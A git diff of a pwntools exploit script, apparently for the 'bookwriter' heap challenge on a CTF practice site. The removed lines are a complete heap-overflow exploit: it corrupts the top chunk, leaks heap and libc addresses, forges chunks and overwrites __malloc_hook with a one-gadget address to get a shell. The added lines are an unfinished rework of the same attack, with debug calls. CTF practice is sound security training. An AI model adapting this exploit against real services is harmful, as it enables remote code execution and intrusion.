@@ -4,16 +4,20 @@
 # Copyright © 2018 hzshang <hzshang15@gmail.com>
 
 from pwn import *
+import os
+os.environ['LD_LIBRARY_PATH']="/dbg64/lib"
 context.log_level="debug"
+
 pwn_file="./bookwriter"
 libc_address=0
 heap_address=0
-libc=ELF("./bc.so.6")
+libc=ELF("/dbg64/lib/libc.so.6")
 if len(sys.argv)==1:
     conn=process(pwn_file)
     pid=conn.pid
 else:
-    conn=remote("work",4444)
+    conn=remote("ww",4444)
+    #conn=remote("chall.pwnable.tw",10304)
     pid=0
 
 def debug():
@@ -44,7 +48,8 @@ def show(index):
     conn.sendlineafter("Your choice :","2")
     conn.sendlineafter("Index of page :",str(index))
     conn.recvlines(2)
-    return conn.recvuntil("\n----------------------",drop=True)
+    ret=conn.recvuntil("\n----------------------",drop=True)
+    return ret
 
 def edit(index,name):
     conn.sendlineafter("Your choice :","3")
@@ -52,50 +57,34 @@ def edit(index,name):
     conn.sendafter("Content:",name)
 
 login("a"*0x40)
-# NO.0 in heap 0
-add(0x808,"a"*0x808)
-edit(0,"a"*0x808)
-edit(0,"a"*0x808+p64(0x107f1)[:3])
+add(0x300,"a"*0x300)# 0
+heap_address=u64(inform(False)[0x40:].ljust(8,"\x00"))-0x10
+add(0x308,"a"*0x308)# 1
+edit(1,"a"*0x308)
+# f={
+#     0x200:p64(0),
+#     0x208:p64(0x101),
+#     0x210:p64(0x6020A0-0x18),
+#     0x218:p64(0x6020A0-0x10),
+#     0x300:p64(0x100),
+#     0x308:p64(0x9d1)[:3]
+# }
+edit(1,"a"*0x308+p64(0x109d1)[:3])
+add(0x15000,"a")#2
+
+edit(1,"a"*0x308+p64(0x309d1)[:3])
+
+add(0x15000,"a")#3
+add(0x108,"a"*0x108)
+edit(4,"a"*0x108)#4
+edit(4,"a"*0x108+p64(0x298b0))
 debug()
-# No.1 it will store in a new heap and we get a unsortbin chunk
-add(0x10da8,"a"*0x10da8)
-edit(1,"a"*0x10da8)
-edit(1,"a"*0x10da8+p64(0x0251)[:3])
-# No.2 
-add(0x11008,"a"*0x11008)
-# now we have a largebin and an unsort bin
-edit(0,"a"*0x808+p64(0x507d1)[:3])
-edit(2,"a"*0xefd0+p64(0x507d0)+p64(0x10)+p64(0x0)+p64(0x10))
-# No.3
-add(0x17008,"a"*0x10)
-heap_address=u64(show(3)[16:21].ljust(8,"\x00"))-0x810
-# No.4
-add(0x17008,"a")
-libc_address=(u64((show(4)[0:6].ljust(8,"\x00")))&0xffffffffffffff00)-0x36300-0x38e000
-f={
-    0x0:p64(0),
-    0x8:p64(0x231),
-    0x10:p64(heap_address+0x31db0),
-    0x18:p64(heap_address+0x31db0),
-}
-inform(True,fit(f,filler="a"))
-# No.5
-f={
-    0x2568:p64(0x231),
-    0x2570:p64(0x602060),
-    0x2578:p64(0x602060),
-    0x2560+0x230:p64(0x230),
-    0x2560+0x238:p64(0x10),
-    0x2560+0x240:p64(0),
-    0x2560+0x248:p64(0x11)
-}
-add(0x17008,fit(f,filler="a",length=0x17008))
-add(0x220,p64(0x602060)+p64(libc_address+0x3c4d98))
-add(0x220,"a"*(0xa0-0x70)+p64(libc_address+libc.symbols["__malloc_hook"])+p64(0)+p64(0))
-edit(0,p64(0xf0567+libc_address))
-conn.sendlineafter("Your choice :","1")
-conn.sendlineafter("Size of page :","12")
+add(0x1a000,"a")#5
+debug()
+add(0x2008,"a"*0x2008)#5
+edit(5,"a"*0x2008)
+edit(5,"a"*0x2008+p64(0xfe1)[:2])
+
+# add(0x2000,"a")#6
+debug()
 conn.interactive()
-
-
-
